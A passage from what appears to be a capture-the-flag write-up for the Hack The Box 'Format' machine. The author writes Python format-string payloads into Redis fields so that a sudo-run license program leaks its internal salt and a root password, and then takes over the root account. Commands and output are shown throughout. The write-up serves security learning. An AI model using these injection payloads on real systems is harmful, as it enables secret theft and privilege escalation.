Before it starts performing operations, the program checks whether we are running it as root, i.e., as a privileged user.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/40.png"/><br/><br/>
Upon closer inspection, we find the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/41.png"/><br/><br/>
Firstly, we see interaction with Redis using the same socket through which we gained access.<br/><br/>
Additionally, the program reads the file <code>/root/license/secret</code>, which appears to contain some kind of key.<br/><br/>
The issue with this vulnerability arises here:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/42.png"/><br/><br/>
First, it stores the username from the user we input through the <code>provision</code> parameter.<br/><br/>
Then, it creates a variable called <code>firstlast</code> that combines the <code>first-name</code> and <code>last-name</code> fields from the user we input through the <code>provision</code> parameter.<br/><br/>
The problem arises when defining the <code>license_key</code> variable because it uses <code>Format String</code> on values of variables that we can control. For example, in the <code>first-name</code> field, we can enter any information we want since we have access to Redis. By using the format in this way, it exposes the vulnerability we saw in the <a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities">article</a>.<br/><br/>
Searching a bit more on the internet, I also found the following article on <a href="https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input">StackExchange</a>. This latter one is more comprehensive regarding the exploitation of the vulnerability.<br/><br/>
Upon further reading of the code, we see that what's stored in the <code>license_key</code> variable is displayed on the screen:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/43.png"/><br/><br/>
<h3><br>Exploitation</br></h3><br>
Firstly, if we input a user through the <code>provision</code> parameter, we get the following report:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix</span>

<span class="n">User</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">exist</span><span class="o">.</span> <span class="n">Please</span> <span class="n">provide</span> <span class="n">valid</span> <span class="n">username</span><span class="o">.</span>

<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Let's try adding the user <code>elswix</code> through Redis:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span>
<span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
</pre></div>

We can add it using the <code>HMSET</code> command:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">HMSET</span> <span class="n">elswix</span> <span class="n">username</span> <span class="n">elswix</span> <span class="n">first</span><span class="o">-</span><span class="n">name</span> <span class="n">elswix</span> <span class="n">last</span><span class="o">-</span><span class="n">name</span> <span class="n">elswix</span>
<span class="n">OK</span>
<span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
</pre></div>

Now, when executing the same command with sudo:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix</span>

<span class="n">Plaintext</span> <span class="n">license</span> <span class="n">key</span><span class="p">:</span>
<span class="o">------------------------------------------------------</span>
<span class="n">microblogelswixq6o</span><span class="p">}</span><span class="o">|</span><span class="n">rY88</span><span class="p">)</span><span class="mi">4</span><span class="n">H</span><span class="o">=</span><span class="n">fB</span><span class="p">;</span><span class="n">Rf</span><span class="nd">@wx</span><span class="p">;</span><span class="n">Og3</span><span class="p">}</span><span class="sa">f</span><span class="s1">'~aw=&gt;KBZ"|&lt;&lt;elswixelswix</span>

<span class="n">Encrypted</span> <span class="n">license</span> <span class="n">key</span> <span class="p">(</span><span class="n">distribute</span> <span class="n">to</span> <span class="n">customer</span><span class="p">):</span>
<span class="o">------------------------------------------------------</span>
<span class="n">gAAAAABlGa55Ei1j2RSdPvbwaaXJzMC2L1aLRyRami9bizj2cTzVsGI2Nafo</span><span class="o">-</span><span class="n">pNqSjfyLe3SSreJLzJsD7186CvyMJcy5ZKM1eWkWIm72oKmmC74JWgAYN_gl7LxFhpIWAN2ypdMDU2XNBaVLS</span><span class="o">-</span><span class="n">pjvHH9e7ILbglay4SATvztnsJ4WZzgfbG</span><span class="o">-</span><span class="mi">04</span><span class="o">=</span>

<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

We see that we are correct, and we can control what is stored in the variables. Knowing this, we can attempt to access variables defined in the program.<br/><br/>
First, I will try to list the contents of the <code>salt</code> variable since I know its value and can verify if the vulnerability works.<br/><br/>
Remember that we need to change the value of some of the fields that are displayed on the screen, for example, the <code>first-name</code> field:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">HMSET</span> <span class="n">elswix1</span> <span class="n">username</span> <span class="n">elswix</span> <span class="n">first</span><span class="o">-</span><span class="n">name</span> <span class="p">{</span><span class="n">license</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">salt</span><span class="p">]}</span> <span class="n">last</span><span class="o">-</span><span class="n">name</span> <span class="n">elswix</span>
<span class="n">OK</span>
<span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
</pre></div>

Now, if I try to execute the program:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix1</span>

<span class="n">Plaintext</span> <span class="n">license</span> <span class="n">key</span><span class="p">:</span>
<span class="o">------------------------------------------------------</span>
<span class="n">microblogelswix0</span><span class="o">+</span><span class="err">!</span><span class="n">eJ</span><span class="o">-</span><span class="n">h2b</span><span class="p">[</span><span class="n">JN</span><span class="o">&amp;@~</span><span class="n">G5mBcR7</span><span class="o">-</span><span class="n">Rh</span><span class="err">!</span>\<span class="n">GQWw4Zc</span><span class="o">&gt;</span><span class="err">!</span><span class="o">&amp;</span><span class="n">N</span><span class="o">=</span><span class="n">Lb</span><span class="s1">'microblogsalt123'</span><span class="n">elswix</span>

<span class="n">Encrypted</span> <span class="n">license</span> <span class="n">key</span> <span class="p">(</span><span class="n">distribute</span> <span class="n">to</span> <span class="n">customer</span><span class="p">):</span>
<span class="o">------------------------------------------------------</span>
<span class="n">gAAAAABlGa8qJfE91BdIPgImJcqKixVukvjw844HS2ITaHqGCEjF0yIeasPJo7bIY3ITOcVH3xAUNUzx6nfykSNlyRVa250XuHMpuQ_pBEEjHwNVHnFeLTB</span><span class="o">-</span><span class="mf">3E4</span><span class="n">qCJ7</span><span class="o">-</span><span class="mi">3</span><span class="n">T0SXh8dk_1IOj7_Uutzi2rPgSiixPJ8quEducf9FHrVgNniqfXguAqJAAS</span><span class="o">-</span><span class="n">NsPrV97WOiXa4wM6</span>

<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

We see the value of the <code>salt</code> variable, which is <code>microblogsalt123</code>.<br/><br/>
Since we can list the value of any variable, we can attempt to read the <code>secret</code> variable, which, from what we've seen, appears to contain a key stored in a file called <code>/root/license/secret</code>.<br/><br/>
In my case, I will focus on the <code>secret_encoded</code> variable as it will be easier to identify in the output since the value will be stored in bytes format.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">HMSET</span> <span class="n">elswix2</span> <span class="n">username</span> <span class="n">elswix</span> <span class="n">first</span><span class="o">-</span><span class="n">name</span> <span class="p">{</span><span class="n">license</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">secret_encoded</span><span class="p">]}</span> <span class="n">last</span><span class="o">-</span><span class="n">name</span> <span class="n">elswix</span>
<span class="n">OK</span>
<span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
</pre></div>

Once again, we try to execute the program:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix2</span>

<span class="n">Plaintext</span> <span class="n">license</span> <span class="n">key</span><span class="p">:</span>
<span class="o">------------------------------------------------------</span>
<span class="n">microblogelswixcxhik</span><span class="n">#u!A?8:bQtIastz\D8sYQyC:Q@ow5;&lt;2KT7b'unCR4ckaBL3Pa$$w0rd'elswix</span>

<span class="n">Encrypted</span> <span class="n">license</span> <span class="n">key</span> <span class="p">(</span><span class="n">distribute</span> <span class="n">to</span> <span class="n">customer</span><span class="p">):</span>
<span class="o">------------------------------------------------------</span>
<span class="n">gAAAAABlGbCHM</span><span class="o">-</span><span class="n">PvcoDTv1oxmO</span><span class="o">-</span><span class="mi">7</span><span class="n">sr5Wi7w7M_wxiERGuDt814ENoTZi7UoENeC</span><span class="o">-</span><span class="n">yRJpfzm7u4wxGnIKGRfsyqmZNQfv9VQiaAugEevkcYhLjORImzj4ASxocszr24jF_KU5d5UUDh9HM</span><span class="o">-</span><span class="n">U7thUul24SBN</span><span class="o">-</span><span class="n">k0P5Z7AU3X3Rhb_EAhjxHWz</span><span class="o">-</span><span class="n">GpScM18CnZ9BHjB249o1cX5ET</span>

<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

As we can see, the string <code>unCR4ckaBL3Pa$$w0rd</code> was displayed. This appears to be a password that we can copy and try to use to escalate to the <code>root</code> user.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span>
<span class="n">Password</span><span class="p">:</span> 
<span class="nd">root@format</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cooper</span><span class="root1">#</span>
</pre></div>

The password we obtained by displaying the value of the <code>secret</code> variable corresponds to the system-level <code>root</code> user's password.<br/><br/>
Finally, we can read the last flag:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat root.txt</span>
<span class="mi">1</span><span class="n">bd03</span><span class="o">**********************</span><span class="mi">1</span><span class="n">d68d</span>
<span class="nd">root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
</pre></div></br></br></br></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
